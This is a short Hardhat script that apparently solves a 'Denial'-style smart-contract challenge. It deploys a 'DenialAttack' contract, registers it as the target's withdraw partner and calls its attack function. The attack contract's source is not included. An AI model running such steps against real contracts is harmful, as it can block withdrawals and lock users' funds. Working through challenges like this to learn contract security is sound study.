const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x763e69d24a03c0c8B256e470D9fE9e0753504D07";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const contractInterface = [
  {
    inputs: [],
    name: "contractBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8b7afe2e",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [],
    name: "partner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xbe10862b",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "_partner",
        type: "address",
      },
    ],
    name: "setWithdrawPartner",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x4e1c5914",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x3ccfd60b",
  },
  {
    stateMutability: "payable",
    type: "receive",
    payable: true,
  },
];

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  //   Deploy the PayableContract
  const denialAttackFactory = await ethers.getContractFactory(
    "DenialAttack",
    signer
  );
  const denialAttack = await denialAttackFactory.deploy(CONTRACT_ADDRESS);
  await denialAttack.deployed();
  console.log("PayableContract deployed to:", denialAttack.address);

  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    signer
  );

  const balance = await contract.contractBalance();
  console.log("current balance", balance.toString());

  await contract.setWithdrawPartner(denialAttack.address);
  const partnerPlayer = await contract.partner();
  console.log("new partner address", partnerPlayer);
  await denialAttack.attack();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
